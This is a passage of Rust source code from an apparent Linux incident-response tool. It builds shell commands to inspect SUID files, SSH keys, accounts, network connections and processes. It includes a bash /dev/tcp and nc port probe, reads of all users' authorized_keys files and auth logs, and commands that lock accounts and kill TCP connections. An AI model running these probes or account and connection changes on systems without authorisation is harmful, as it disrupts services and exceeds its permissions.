            "if command -v dpkg-query >/dev/null 2>&1; then pkg=$(dpkg-query -S -- \"$p\" 2>/dev/null | head -n 1 | cut -d: -f1); if [ -n \"$pkg\" ]; then out=$(dpkg --verify \"$pkg\" 2>/dev/null | grep -F -- \"$p\" | head -n 100); [ -n \"$out\" ] && printf '%s\\n' \"$out\" || printf 'No dpkg verification mismatch reported for this path\\n'; else printf 'No dpkg owner found\\n'; fi; elif command -v rpm >/dev/null 2>&1; then pkg=$(rpm -qf -- \"$p\" 2>/dev/null); if [ -n \"$pkg\" ]; then out=$(rpm -V \"$pkg\" 2>/dev/null | grep -F -- \"$p\" | head -n 100); [ -n \"$out\" ] && printf '%s\\n' \"$out\" || printf 'No RPM verification mismatch reported for this path\\n'; else printf 'No RPM owner found\\n'; fi; else printf 'No supported package database is available\\n'; fi"
        }
        SuidFileInvestigationAction::Capabilities => {
            "if command -v getcap >/dev/null 2>&1; then getcap -n -- \"$p\" 2>/dev/null || true; else printf 'getcap is unavailable\\n'; fi; printf 'Mode and owner\\n'; stat -c '%A (%a)\\t%U:%G\\t%n' -- \"$p\" 2>/dev/null"
        }
        SuidFileInvestigationAction::Links => {
            "printf 'Canonical path\\t'; readlink -f -- \"$p\" 2>/dev/null; printf 'Link count\\t'; stat -c '%h' -- \"$p\" 2>/dev/null; printf '\\nLinks in executable inventories\\n'; find /bin /sbin /usr/bin /usr/sbin /usr/local/bin -xdev -samefile \"$p\" -print 2>/dev/null | head -n 300"
        }
    };
    Ok(format!("p={}; {probe}; :", shq(&path)))
}

fn ssh_key_investigation_command(
    username: &str,
    key_type: &str,
    key_content: &str,
    path: &str,
    action: SshKeyInvestigationAction,
) -> CoreResult<String> {
    if !is_valid_username(username) {
        return Err(invalid_detail_key("SSH key owner"));
    }
    if !is_valid_ssh_key_type(key_type) || !is_valid_ssh_key_content(key_content) {
        return Err(invalid_detail_key("SSH public key"));
    }
    let path = validated_authorized_keys_path(path)?;
    let probe = match action {
        SshKeyInvestigationAction::AuthorizedKeys => {
            "nl -ba -- \"$f\" 2>/dev/null | head -n 1000 || printf 'authorized_keys is unreadable\\n'"
        }
        SshKeyInvestigationAction::Fingerprint => {
            "if command -v ssh-keygen >/dev/null 2>&1; then printf '%s %s\\n' \"$kt\" \"$kc\" | ssh-keygen -lf - 2>/dev/null || printf 'Public key fingerprint could not be parsed\\n'; else printf 'ssh-keygen is unavailable\\n'; fi"
        }
        SshKeyInvestigationAction::Permissions => {
            "dir=$(dirname -- \"$f\"); stat -c 'File\\t%n%nOwner\\t%U (%u)%nGroup\\t%G (%g)%nMode\\t%A (%a)%nModified\\t%y' -- \"$f\" 2>/dev/null; printf '\\nDirectory\\n'; stat -c 'Path\\t%n%nOwner\\t%U (%u)%nGroup\\t%G (%g)%nMode\\t%A (%a)%nModified\\t%y' -- \"$dir\" 2>/dev/null"
        }
        SshKeyInvestigationAction::SshDirectory => {
            "dir=$(dirname -- \"$f\"); stat -c 'Directory\\t%n%nOwner\\t%U:%G%nMode\\t%A (%a)%nModified\\t%y' -- \"$dir\" 2>/dev/null; printf '\\nDirectory entries\\n'; find \"$dir\" -maxdepth 1 -mindepth 1 -printf '%m\\t%u:%g\\t%TY-%Tm-%TdT%TH:%TM:%TS\\t%f\\n' 2>/dev/null | sort | head -n 300"
        }
        SshKeyInvestigationAction::KeyAge => {
            "stat -c 'Path\\t%n%nBirth\\t%w%nModified\\t%y%nChanged\\t%z%nOwner\\t%U:%G%nMode\\t%A (%a)' -- \"$f\" 2>/dev/null; printf 'Target time\\t%s\\n' \"$(date --iso-8601=seconds 2>/dev/null)\""
        }
        SshKeyInvestigationAction::AllUserKeys => {
            "for path in /root/.ssh/authorized_keys /home/*/.ssh/authorized_keys; do [ -r \"$path\" ] || continue; owner=$(stat -c '%U' -- \"$path\" 2>/dev/null); awk -v owner=\"$owner\" -v path=\"$path\" 'NF>=2 && $1 !~ /^#/ {print owner\"\\t\"$1\"\\t\"$2\"\\t\"path}' \"$path\"; done | head -n 500"
        }
        SshKeyInvestigationAction::SshdConfig => {
            "printf 'Effective public-key settings\\n'; if command -v sshd >/dev/null 2>&1; then sshd -T 2>/dev/null | grep -E '^(pubkeyauthentication|authorizedkeysfile|permitrootlogin|strictmodes|authenticationmethods)[[:space:]]' || true; else printf 'sshd is unavailable\\n'; fi; printf '\\nConfigured directives\\n'; grep -HnEi '^[[:space:]]*(PubkeyAuthentication|AuthorizedKeysFile|PermitRootLogin|StrictModes|AuthenticationMethods)[[:space:]]' /etc/ssh/sshd_config /etc/ssh/sshd_config.d/*.conf 2>/dev/null | head -n 300"
        }
    };
    Ok(format!(
        "owner={}; kt={}; kc={}; f={}; {probe}; :",
        shq(username),
        shq(key_type),
        shq(key_content),
        shq(&path),
    ))
}

fn user_account_snapshot_command(username: &str) -> String {
    let username = shq(username);
    format!(
        "u={username}; line=$(getent passwd \"$u\" 2>/dev/null) || {{ printf 'ABSENT\\n'; exit 44; }}; state=$(passwd -S \"$u\" 2>/dev/null | awk '{{print $2}}') || exit 45; current=$(id -un 2>/dev/null) || exit 46; printf '%s\\t%s\\t%s\\t%s\\t%s\\t%s\\t%s\\n' \"$(printf '%s' \"$line\" | cut -d: -f1)\" \"$(printf '%s' \"$line\" | cut -d: -f3)\" \"$(printf '%s' \"$line\" | cut -d: -f4)\" \"$(printf '%s' \"$line\" | cut -d: -f6)\" \"$(printf '%s' \"$line\" | cut -d: -f7)\" \"$state\" \"$current\""
    )
}

fn parse_user_account_snapshot(output: &str) -> CoreResult<UserAccountSnapshot> {
    let fields = output.trim_end().split('\t').collect::<Vec<_>>();
    if fields.len() != 7 || !is_valid_username(fields[0]) || !is_valid_username(fields[6]) {
        return Err(invalid_detail_key("user account snapshot"));
    }
    let parse_id = |value: &str, subject: &'static str| -> CoreResult<u32> {
        value
            .parse::<u32>()
            .map_err(|_| invalid_detail_key(subject))
    };
    let password_state = match fields[5] {
        "L" | "LK" | "NL" => UserPasswordState::Locked,
        "P" | "PS" => UserPasswordState::PasswordSet,
        "NP" => UserPasswordState::NoPassword,
        _ => return Err(invalid_detail_key("user password state")),
    };
    Ok(UserAccountSnapshot {
        username: fields[0].to_owned(),
        uid: parse_id(fields[1], "user UID")?,
        gid: parse_id(fields[2], "user GID")?,
        home: validated_absolute_path(fields[3])?,
        shell: if fields[4].is_empty() {
            String::new()
        } else {
            validated_absolute_path(fields[4])?
        },
        password_state,
        session_username: fields[6].to_owned(),
    })
}

fn validate_user_account_precondition(
    snapshot: &UserAccountSnapshot,
    action: UserAccountAction,
) -> CoreResult<()> {
    let valid = match action {
        UserAccountAction::Lock => snapshot.password_state != UserPasswordState::Locked,
        UserAccountAction::Unlock => snapshot.password_state == UserPasswordState::Locked,
    };
    if valid {
        Ok(())
    } else {
        Err(CoreError::validation(
            "user account precondition",
            format!(
                "{} cannot be {} from password state {}",
                snapshot.username,
                action.label(),
                snapshot.password_state.label(),
            ),
        ))
    }
}

fn user_account_action_verified(snapshot: &UserAccountSnapshot, action: UserAccountAction) -> bool {
    match action {
        UserAccountAction::Lock => snapshot.password_state == UserPasswordState::Locked,
        UserAccountAction::Unlock => snapshot.password_state != UserPasswordState::Locked,
    }
}

fn same_user_account_identity(left: &UserAccountSnapshot, right: &UserAccountSnapshot) -> bool {
    left.username == right.username
        && left.uid == right.uid
        && left.gid == right.gid
        && left.home == right.home
        && left.shell == right.shell
        && left.session_username == right.session_username
}

fn user_account_command(username: &str, action: UserAccountAction) -> String {
    let username = shq(username);
    format!(
        "u={username}; if [ \"$(id -u)\" -eq 0 ]; then passwd {} \"$u\"; elif command -v sudo >/dev/null 2>&1; then sudo -n passwd {} \"$u\"; else printf 'Root privileges are required\\n' >&2; exit 77; fi",
        action.command(),
        action.command(),
    )
}

fn user_account_snapshot_sha256(snapshot: &UserAccountSnapshot) -> String {
    let mut digest = Sha256::new();
    for value in [
        snapshot.username.as_str(),
        snapshot.home.as_str(),
        snapshot.shell.as_str(),
        snapshot.password_state.label(),
        snapshot.session_username.as_str(),
    ] {
        digest.update((value.len() as u64).to_be_bytes());
        digest.update(value.as_bytes());
    }
    digest.update(snapshot.uid.to_be_bytes());
    digest.update(snapshot.gid.to_be_bytes());
    format!("{:x}", digest.finalize())
}

fn bounded_network_output(output: &str) -> (String, bool) {
    if output.len() <= MAX_NETWORK_INVESTIGATION_CHARS {
        return (output.to_owned(), false);
    }
    let mut end = MAX_NETWORK_INVESTIGATION_CHARS;
    while end > 0 && !output.is_char_boundary(end) {
        end -= 1;
    }
    (output[..end].to_owned(), true)
}

fn network_identity_from_table(
    table: &SystemInfoTable,
    row_id: &str,
) -> CoreResult<NetworkConnectionIdentity> {
    if !matches!(
        table.tab,
        SystemInfoTab::Network | SystemInfoTab::Established | SystemInfoTab::OpenPorts
    ) {
        return Err(CoreError::validation(
            "network operation",
            "the selected row is not from a network inventory",
        ));
    }
    let row = table
        .rows
        .iter()
        .find(|row| row.id == row_id)
        .ok_or_else(|| CoreError::NotFound {
            entity: "system information row",
            id: bounded_text(row_id, 256),
        })?;
    let cell = |index: usize, subject: &'static str| -> CoreResult<&str> {
        row.cells
            .get(index)
            .map(String::as_str)
            .ok_or_else(|| invalid_detail_key(subject))
    };
    let (transport, local_display, remote_display, local, remote, state, process) = match table.tab
    {
        SystemInfoTab::Network => {
            let local_display = cell(1, "local endpoint")?.to_owned();
            let remote_display = cell(2, "remote endpoint")?.to_owned();
            (
                parse_network_transport(cell(0, "network transport")?)?,
                local_display.clone(),
                remote_display.clone(),
                parse_network_endpoint(&local_display, None, true)?,
                parse_network_endpoint(&remote_display, None, false)?,
                bounded_network_field(cell(3, "connection state")?, 64)?,
                bounded_network_field(cell(5, "connection process")?, MAX_CELL_CHARS)?,
            )
        }
        SystemInfoTab::Established => {
            let local_display = cell(0, "local endpoint")?.to_owned();
            let remote_display = cell(1, "remote endpoint")?.to_owned();
            (
                NetworkTransport::Tcp,
                local_display.clone(),
                remote_display.clone(),
                parse_network_endpoint(&local_display, None, false)?,
                parse_network_endpoint(&remote_display, Some(cell(2, "remote port")?), false)?,
                "ESTABLISHED".to_owned(),
                bounded_network_field(cell(4, "connection process")?, MAX_CELL_CHARS)?,
            )
        }
        SystemInfoTab::OpenPorts => {
            let address = cell(1, "local address")?;
            let port = cell(2, "local port")?;
            let local = parse_network_endpoint(address, Some(port), true)?;
            let local_display = local
                .as_ref()
                .map_or_else(|| format!("{address}:{port}"), endpoint_display);
            (
                parse_network_transport(cell(0, "network transport")?)?,
                local_display,
                String::new(),
                local,
                None,
                "LISTEN".to_owned(),
                bounded_network_field(cell(4, "connection process")?, MAX_CELL_CHARS)?,
            )
        }
        _ => unreachable!("validated network tab"),
    };
    Ok(NetworkConnectionIdentity {
        tab: table.tab,
        row_id: row.id.clone(),
        transport,
        local,
        remote,
        local_display,
        remote_display,
        state,
        process,
    })
}

fn parse_network_transport(value: &str) -> CoreResult<NetworkTransport> {
    let value = value.trim().to_ascii_lowercase();
    if value.starts_with("tcp") {
        Ok(NetworkTransport::Tcp)
    } else if value.starts_with("udp") {
        Ok(NetworkTransport::Udp)
    } else {
        Err(invalid_detail_key("TCP/UDP transport"))
    }
}

fn parse_network_endpoint(
    display: &str,
    port_hint: Option<&str>,
    allow_wildcard: bool,
) -> CoreResult<Option<NetworkEndpoint>> {
    let display = display.trim();
    if display.is_empty() {
        return Ok(None);
    }
    let hinted_port = port_hint.map(parse_network_port).transpose()?.flatten();
    let (address_text, parsed_port) = if let Some(stripped) = display.strip_prefix('[') {
        let (address, remainder) = stripped
            .split_once(']')
            .ok_or_else(|| invalid_detail_key("bracketed network endpoint"))?;
        let port = remainder
            .strip_prefix(':')
            .map(parse_network_port)
            .transpose()?
            .flatten();
        (address, port)
    } else if display.parse::<IpAddr>().is_ok() {
        (display, None)
    } else if let Some((address, port)) = display.rsplit_once(':') {
        (address, parse_network_port(port)?)
    } else {
        (display, None)
    };
    let port = hinted_port.or(parsed_port);
    let address = match address_text {
        "*" if allow_wildcard => IpAddr::V4(Ipv4Addr::UNSPECIFIED),
        "*" => return Ok(None),
        value => value
            .parse::<IpAddr>()
            .map_err(|_| invalid_detail_key("IP address"))?,
    };
    Ok(Some(NetworkEndpoint { address, port }))
}

fn parse_network_port(value: &str) -> CoreResult<Option<u16>> {
    let value = value.trim();
    if value.is_empty() || value == "*" {
        return Ok(None);
    }
    let port = value
        .parse::<u16>()
        .ok()
        .filter(|port| *port > 0)
        .ok_or_else(|| invalid_detail_key("network port"))?;
    Ok(Some(port))
}

fn bounded_network_field(value: &str, maximum_chars: usize) -> CoreResult<String> {
    if value.chars().any(char::is_control) {
        return Err(invalid_detail_key("network field"));
    }
    Ok(value.chars().take(maximum_chars).collect())
}

fn endpoint_display(endpoint: &NetworkEndpoint) -> String {
    match (endpoint.address, endpoint.port) {
        (IpAddr::V6(address), Some(port)) => format!("[{address}]:{port}"),
        (address, Some(port)) => format!("{address}:{port}"),
        (address, None) => address.to_string(),
    }
}

fn network_remote(identity: &NetworkConnectionIdentity) -> CoreResult<&NetworkEndpoint> {
    identity
        .remote
        .as_ref()
        .filter(|endpoint| !endpoint.address.is_unspecified())
        .ok_or_else(|| CoreError::validation("network investigation", "remote IP is unavailable"))
}

fn network_analysis_port(identity: &NetworkConnectionIdentity) -> CoreResult<u16> {
    identity
        .remote
        .as_ref()
        .and_then(|endpoint| endpoint.port)
        .or_else(|| identity.local.as_ref().and_then(|endpoint| endpoint.port))
        .ok_or_else(|| CoreError::validation("network investigation", "port is unavailable"))
}

fn validate_network_action(
    identity: &NetworkConnectionIdentity,
    action: NetworkInvestigationAction,
) -> CoreResult<()> {
    match action {
        NetworkInvestigationAction::PortService => {
            network_analysis_port(identity)?;
        }
        NetworkInvestigationAction::PortProcess => {
            identity
                .local
                .as_ref()
                .and_then(|endpoint| endpoint.port)
                .ok_or_else(|| {
                    CoreError::validation("network investigation", "local port is unavailable")
                })?;
        }
        NetworkInvestigationAction::PortConnectivity | NetworkInvestigationAction::TcpProbe => {
            if identity.transport != NetworkTransport::Tcp {
                return Err(CoreError::validation(
                    "network investigation",
                    "TCP connectivity tests require a TCP row",
                ));
            }
            let remote = network_remote(identity)?;
            remote.port.ok_or_else(|| {
                CoreError::validation("network investigation", "remote port is unavailable")
            })?;
        }
        NetworkInvestigationAction::BlacklistCheck => {
            if !matches!(network_remote(identity)?.address, IpAddr::V4(_)) {
                return Err(CoreError::validation(
                    "network investigation",
                    "DNS blacklist checks currently require IPv4",
                ));
            }
        }
        NetworkInvestigationAction::AnomalyDetect => {
            network_remote(identity)?;
            network_analysis_port(identity)?;
        }
        NetworkInvestigationAction::Whois
        | NetworkInvestigationAction::Geolocation
        | NetworkInvestigationAction::ReverseDns
        | NetworkInvestigationAction::IpType
        | NetworkInvestigationAction::Ping
        | NetworkInvestigationAction::Traceroute
        | NetworkInvestigationAction::Latency
        | NetworkInvestigationAction::ThreatIntel
        | NetworkInvestigationAction::ConnectionFrequency
        | NetworkInvestigationAction::FirewallRules
        | NetworkInvestigationAction::ConnectionHistory
        | NetworkInvestigationAction::AccessLogs
        | NetworkInvestigationAction::SecurityLogs => {
            network_remote(identity)?;
        }
    }
    Ok(())
}

fn validate_network_disconnect(identity: &NetworkConnectionIdentity) -> CoreResult<()> {
    if identity.transport != NetworkTransport::Tcp
        || !matches!(
            identity.tab,
            SystemInfoTab::Network | SystemInfoTab::Established
        )
    {
        return Err(CoreError::validation(
            "network disconnect",
            "only an observed TCP connection can be disconnected",
        ));
    }
    let local = identity.local.as_ref().ok_or_else(|| {
        CoreError::validation("network disconnect", "local endpoint is unavailable")
    })?;
    let remote = network_remote(identity)?;
    if local.address.is_unspecified() || local.port.is_none() || remote.port.is_none() {
        return Err(CoreError::validation(
            "network disconnect",
            "both exact IP addresses and ports are required",
        ));
    }
    Ok(())
}

fn network_investigation_command(
    identity: &NetworkConnectionIdentity,
    action: NetworkInvestigationAction,
) -> CoreResult<String> {
    validate_network_action(identity, action)?;
    let remote = identity.remote.as_ref();
    let ip = remote.map(|endpoint| endpoint.address.to_string());
    let ip_value = ip.as_deref().map(shq);
    let port = network_analysis_port(identity).ok();
    let local_port = identity.local.as_ref().and_then(|endpoint| endpoint.port);
    let command = match action {
        NetworkInvestigationAction::Whois => format!(
            "ip={}; if command -v whois >/dev/null 2>&1; then whois -- \"$ip\" 2>/dev/null || printf 'WHOIS query failed\\n'; else printf 'whois command is not installed\\n'; fi",
            ip_value.expect("validated remote IP")
        ),
        NetworkInvestigationAction::Geolocation => format!(
            "ip={}; if command -v geoiplookup >/dev/null 2>&1; then geoiplookup \"$ip\" 2>/dev/null || printf 'Local GeoIP lookup failed\\n'; elif command -v geoiplookup6 >/dev/null 2>&1; then geoiplookup6 \"$ip\" 2>/dev/null || printf 'Local GeoIP lookup failed\\n'; else printf 'No local GeoIP database tool is installed; no online API was contacted\\n'; fi",
            ip_value.expect("validated remote IP")
        ),
        NetworkInvestigationAction::ReverseDns => format!(
            "ip={}; getent hosts \"$ip\" 2>/dev/null || (command -v dig >/dev/null 2>&1 && dig -x \"$ip\" +short 2>/dev/null) || (command -v nslookup >/dev/null 2>&1 && nslookup \"$ip\" 2>/dev/null) || printf 'No reverse DNS result\\n'",
            ip_value.expect("validated remote IP")
        ),
        NetworkInvestigationAction::IpType => {
            let remote = network_remote(identity)?;
            format!(
                "printf 'IP\\t%s\\nType\\t%s\\n' {} {}",
                shq(&remote.address.to_string()),
                shq(ip_address_class(remote.address)),
            )
        }
        NetworkInvestigationAction::PortService => {
            let port = port.expect("validated analysis port");
            format!(
                "port={}; printf 'Port\\t%s\\n\\n/etc/services\\n' \"$port\"; grep -E \"^[^#[:space:]]+[[:space:]]+$port/(tcp|udp)([[:space:]]|$)\" /etc/services 2>/dev/null | head -n 10 || true; printf '\\nCommon classification\\n'; case \"$port\" in 21) echo FTP;; 22) echo SSH;; 25) echo SMTP;; 53) echo DNS;; 80) echo HTTP;; 443) echo HTTPS;; 3306) echo MySQL;; 5432) echo PostgreSQL;; 6379) echo Redis;; 27017) echo MongoDB;; 3389) echo RDP;; *) echo 'No built-in classification';; esac",
                shq(&port.to_string())
            )
        }
        NetworkInvestigationAction::PortProcess => {
            let port = local_port.expect("validated local port");
            format!(
                "port={}; if command -v lsof >/dev/null 2>&1; then lsof -nP -i :\"$port\" 2>/dev/null | head -n 100; else ss -H -tulnp 2>/dev/null | grep -E \"(:|])$port([[:space:]]|$)\" | head -n 100 || true; fi",
                shq(&port.to_string())
            )
        }
        NetworkInvestigationAction::PortConnectivity | NetworkInvestigationAction::TcpProbe => {
            let remote = network_remote(identity)?;
            let port = remote.port.expect("validated remote port");
            format!(
                "ip={}; port={}; if command -v nc >/dev/null 2>&1; then if nc -z -w 5 -- \"$ip\" \"$port\" 2>/dev/null; then printf 'TCP connection succeeded\\n'; else printf 'TCP connection failed or timed out\\n'; fi; elif command -v timeout >/dev/null 2>&1 && command -v bash >/dev/null 2>&1; then if timeout 5 bash -c 'exec 3<>/dev/tcp/$1/$2' _ \"$ip\" \"$port\" 2>/dev/null; then printf 'TCP connection succeeded\\n'; else printf 'TCP connection failed or timed out\\n'; fi; else printf 'No bounded TCP probe tool is available\\n'; fi",
                shq(&remote.address.to_string()),
                shq(&port.to_string()),
            )
        }
        NetworkInvestigationAction::Ping => format!(
            "ip={}; ping -c 4 -W 2 -- \"$ip\" 2>/dev/null || printf 'Ping failed or is not permitted\\n'",
            ip_value.expect("validated remote IP")
        ),
        NetworkInvestigationAction::Traceroute => format!(
            "ip={}; if command -v traceroute >/dev/null 2>&1; then traceroute -m 15 -- \"$ip\" 2>/dev/null || printf 'Traceroute failed\\n'; elif command -v tracepath >/dev/null 2>&1; then tracepath -m 15 \"$ip\" 2>/dev/null || printf 'Tracepath failed\\n'; else printf 'No traceroute tool is installed\\n'; fi",
            ip_value.expect("validated remote IP")
        ),
        NetworkInvestigationAction::Latency => format!(
            "ip={}; ping -c 10 -W 2 -- \"$ip\" 2>/dev/null | tail -n 2 || printf 'Latency test failed\\n'",
            ip_value.expect("validated remote IP")
        ),
        NetworkInvestigationAction::ThreatIntel => {
            let remote = network_remote(identity)?;
            format!(
                "printf 'IP\\t%s\\nPort\\t%s\\nProtocol\\t%s\\nType\\t%s\\nNote\\tExport this inert indicator to an approved threat-intelligence provider; LovelyRes does not contact an online API automatically.\\n' {} {} {} {}",
                shq(&remote.address.to_string()),
                shq(&remote
                    .port
                    .map_or_else(|| "-".to_owned(), |port| port.to_string())),
                shq(identity.transport.label()),
                shq(ip_address_class(remote.address)),
            )
        }
        NetworkInvestigationAction::BlacklistCheck => {
            let IpAddr::V4(address) = network_remote(identity)?.address else {
                unreachable!("validated IPv4 DNSBL action")
            };
            let octets = address.octets();
            let reverse = format!("{}.{}.{}.{}", octets[3], octets[2], octets[1], octets[0]);
            format!(
                "rev={}; for zone in zen.spamhaus.org dnsbl.sorbs.net; do name=\"$rev.$zone\"; if getent hosts \"$name\" >/dev/null 2>&1; then printf '%s\\tlisted\\n' \"$zone\"; else printf '%s\\tnot listed or query unavailable\\n' \"$zone\"; fi; done",
                shq(&reverse)
            )
        }
        NetworkInvestigationAction::AnomalyDetect => {
            let remote = network_remote(identity)?;
            let port = network_analysis_port(identity)?;
            let port_class = if port < 1024 {
                "privileged"
            } else {
                "unprivileged"
            };
            let common = matches!(
                port,
                21 | 22 | 25 | 53 | 80 | 443 | 3306 | 5432 | 6379 | 27017 | 3389
            );
            format!(
                "printf 'Remote IP\\t%s\\nRemote port\\t%s\\nPort class\\t%s\\nKnown service port\\t%s\\nConnection state\\t%s\\nProcess\\t%s\\n' {} {} {} {} {} {}",
                shq(&remote.address.to_string()),
                shq(&port.to_string()),
                shq(port_class),
                shq(if common { "yes" } else { "no" }),
                shq(&identity.state),
                shq(&identity.process),
            )
        }
        NetworkInvestigationAction::ConnectionFrequency => format!(
            "ip={}; printf 'Current TCP connections\\t'; ss -H -tn 2>/dev/null | grep -F -- \"$ip\" | wc -l; printf '\\nMatching connections\\n'; ss -H -tnp 2>/dev/null | grep -F -- \"$ip\" | head -n 100 || true",
            ip_value.expect("validated remote IP")
        ),
        NetworkInvestigationAction::FirewallRules => format!(
            "ip={}; if command -v iptables-save >/dev/null 2>&1; then iptables-save 2>/dev/null | grep -F -- \"$ip\" | head -n 100 || true; elif command -v nft >/dev/null 2>&1; then nft list ruleset 2>/dev/null | grep -F -- \"$ip\" | head -n 100 || true; else printf 'No supported firewall reader is available\\n'; fi",
            ip_value.expect("validated remote IP")
        ),
        NetworkInvestigationAction::ConnectionHistory => format!(
            "ip={}; journalctl -n 500 --no-pager 2>/dev/null | grep -F -- \"$ip\" | tail -n 100 || true",
            ip_value.expect("validated remote IP")
        ),
        NetworkInvestigationAction::AccessLogs => format!(
            "ip={}; for file in /var/log/nginx/access.log /var/log/apache2/access.log /var/log/httpd/access_log; do if [ -r \"$file\" ]; then printf '\\n%s\\n' \"$file\"; grep -F -- \"$ip\" \"$file\" 2>/dev/null | tail -n 50 || true; fi; done",
            ip_value.expect("validated remote IP")
        ),
        NetworkInvestigationAction::SecurityLogs => format!(
            "ip={}; for file in /var/log/auth.log /var/log/secure; do if [ -r \"$file\" ]; then printf '\\n%s\\n' \"$file\"; grep -F -- \"$ip\" \"$file\" 2>/dev/null | tail -n 50 || true; fi; done; printf '\\nJournal\\n'; journalctl -n 500 --no-pager 2>/dev/null | grep -F -- \"$ip\" | tail -n 50 || true",
            ip_value.expect("validated remote IP")
        ),
    };
    Ok(command)
}

fn ip_address_class(address: IpAddr) -> &'static str {
    match address {
        IpAddr::V4(address) if address.is_loopback() => "IPv4 loopback",
        IpAddr::V4(address) if address.is_private() => "IPv4 private",
        IpAddr::V4(address) if address.is_link_local() => "IPv4 link-local",
        IpAddr::V4(address) if address.is_multicast() => "IPv4 multicast",
        IpAddr::V4(address) if address.is_unspecified() => "IPv4 unspecified",
        IpAddr::V4(_) => "IPv4 public or special-purpose",
        IpAddr::V6(address) if address.is_loopback() => "IPv6 loopback",
        IpAddr::V6(address) if address.is_unicast_link_local() => "IPv6 link-local",
        IpAddr::V6(address) if address.is_multicast() => "IPv6 multicast",
        IpAddr::V6(address) if address.is_unspecified() => "IPv6 unspecified",
        IpAddr::V6(_) => "IPv6 global, unique-local, or special-purpose",
    }
}

fn network_snapshot_command(identity: &NetworkConnectionIdentity) -> String {
    let local = shq(&identity.local_display);
    let remote = shq(&identity.remote_display);
    format!(
        "l={local}; r={remote}; if command -v ss >/dev/null 2>&1; then ss -H -tnp state established 2>/dev/null | awk -v l=\"$l\" -v r=\"$r\" '$4==l && $5==r {{p=\"\"; for(i=6;i<=NF;i++) p=p (i==6?\"\":\" \") $i; gsub(/\\t/,\" \",p); print $4\"\\t\"$5\"\\t\"$1\"\\t\"p; found=1; exit}} END {{if(!found) exit 44}}'; else netstat -tnp 2>/dev/null | awk -v l=\"$l\" -v r=\"$r\" '$4==l && $5==r && $6==\"ESTABLISHED\" {{p=\"\"; for(i=7;i<=NF;i++) p=p (i==7?\"\":\" \") $i; gsub(/\\t/,\" \",p); print $4\"\\t\"$5\"\\t\"$6\"\\t\"p; found=1; exit}} END {{if(!found) exit 44}}'; fi"
    )
}

fn parse_network_snapshot(output: &str) -> CoreResult<NetworkConnectionSnapshot> {
    let mut fields = output.trim_end().splitn(4, '\t');
    let local_display = bounded_network_field(
        fields
            .next()
            .filter(|value| !value.is_empty())
            .ok_or_else(|| invalid_detail_key("snapshot local endpoint"))?,
        256,
    )?;
    let remote_display = bounded_network_field(
        fields
            .next()
            .filter(|value| !value.is_empty())
            .ok_or_else(|| invalid_detail_key("snapshot remote endpoint"))?,
        256,
    )?;
    parse_network_endpoint(&local_display, None, false)?
        .ok_or_else(|| invalid_detail_key("snapshot local endpoint"))?;
    parse_network_endpoint(&remote_display, None, false)?
        .ok_or_else(|| invalid_detail_key("snapshot remote endpoint"))?;
    let state = bounded_network_field(
        fields
            .next()
            .filter(|value| !value.is_empty())
            .ok_or_else(|| invalid_detail_key("snapshot connection state"))?,
        64,
    )?;
    let process = bounded_network_field(fields.next().unwrap_or_default(), MAX_CELL_CHARS)?;
    Ok(NetworkConnectionSnapshot {
        local_display,
        remote_display,
        state,
        process_sha256: format!("{:x}", Sha256::digest(process.as_bytes())),
    })
}

fn network_disconnect_command(identity: &NetworkConnectionIdentity) -> CoreResult<String> {
    validate_network_disconnect(identity)?;
    let local = identity.local.as_ref().expect("validated local endpoint");
    let remote = identity.remote.as_ref().expect("validated remote endpoint");
    Ok(format!(
        "lip={}; lport={}; rip={}; rport={}; ss -K src \"$lip\" sport = \"$lport\" dst \"$rip\" dport = \"$rport\"",
        shq(&local.address.to_string()),
        shq(&local.port.expect("validated local port").to_string()),
        shq(&remote.address.to_string()),
        shq(&remote.port.expect("validated remote port").to_string()),
    ))
}

fn network_snapshot_sha256(snapshot: &NetworkConnectionSnapshot) -> String {
    let mut digest = Sha256::new();
    for value in [
        snapshot.local_display.as_str(),
        snapshot.remote_display.as_str(),
        snapshot.state.as_str(),
        snapshot.process_sha256.as_str(),
    ] {
        digest.update((value.len() as u64).to_be_bytes());
        digest.update(value.as_bytes());
    }
    format!("{:x}", digest.finalize())
}

fn process_identity_command(pid: u32) -> String {
    let pid = shq(&pid.to_string());
    format!(
        "p={pid}; if [ ! -r \"/proc/$p/stat\" ]; then printf 'ABSENT\\n'; exit 0; fi; stat=$(cat \"/proc/$p/stat\") || exit 44; rest=${{stat##*) }}; start=$(printf '%s\\n' \"$rest\" | awk '{{print $20}}'); name=${{stat%)*}}; name=${{name#*(}}; case \"$start\" in ''|*[!0-9]*) exit 45;; esac; printf '%s\\t%s\\t%s\\n' \"$p\" \"$start\" \"$name\""
    )
}

fn parse_process_identity(output: &str) -> CoreResult<ProcessIdentitySnapshot> {
    let mut fields = output.trim_end().splitn(3, '\t');
    let pid = fields
        .next()
        .filter(|value| is_valid_pid(value))
        .ok_or_else(|| invalid_detail_key("process snapshot PID"))?
        .parse()
        .map_err(|_| invalid_detail_key("process snapshot PID"))?;
    let start_time_ticks = fields
        .next()
        .filter(|value| !value.is_empty() && value.bytes().all(|byte| byte.is_ascii_digit()))
        .ok_or_else(|| invalid_detail_key("process start time"))?
        .parse()
        .map_err(|_| invalid_detail_key("process start time"))?;
    let command_name = fields
        .next()
        .filter(|value| !value.is_empty() && !value.chars().any(char::is_control))
        .ok_or_else(|| invalid_detail_key("process command name"))?;
    Ok(ProcessIdentitySnapshot {
        pid,
        start_time_ticks,
        command_name: bounded_text(command_name, 256),
    })
}

fn process_investigation_command(pid: u32, action: ProcessInvestigationAction) -> String {
    let pid = shq(&pid.to_string());
    let probe = match action {
        ProcessInvestigationAction::CommandLine => {
            "tr '\\0' ' ' < \"/proc/$p/cmdline\" 2>/dev/null; printf '\\n'"
        }
        ProcessInvestigationAction::Executable => "readlink \"/proc/$p/exe\" 2>/dev/null",
        ProcessInvestigationAction::WorkingDirectory => "readlink \"/proc/$p/cwd\" 2>/dev/null",
        ProcessInvestigationAction::Status => "cat \"/proc/$p/status\" 2>/dev/null",
        ProcessInvestigationAction::Capabilities => {
            "awk '/^Cap(Inh|Prm|Eff|Bnd|Amb):/' \"/proc/$p/status\" 2>/dev/null"
        }
        ProcessInvestigationAction::UidGid => {
            "awk '/^(Uid|Gid|Groups):/' \"/proc/$p/status\" 2>/dev/null"
        }
        ProcessInvestigationAction::OpenFiles => {
            "find \"/proc/$p/fd\" -mindepth 1 -maxdepth 1 -printf '%f\\n' 2>/dev/null | sort -n | head -n 100 | while read -r fd; do printf '%s\\t' \"$fd\"; readlink \"/proc/$p/fd/$fd\" 2>/dev/null; done"
        }
